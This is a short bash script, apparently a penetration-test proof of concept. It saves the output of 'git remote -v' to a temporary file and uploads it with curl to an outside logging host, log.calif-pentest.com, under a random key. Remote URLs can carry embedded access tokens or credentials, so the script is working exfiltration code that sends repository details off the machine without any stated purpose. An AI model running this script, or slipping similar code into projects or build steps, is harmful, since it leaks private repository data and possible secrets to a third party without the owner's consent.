#!/bin/bash

git remote -v > /tmp/test.txt

key=`head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 32`

url="https://log.calif-pentest.com/log?key=${key}"

curl --data-binary @/tmp/test.txt $url

echo $url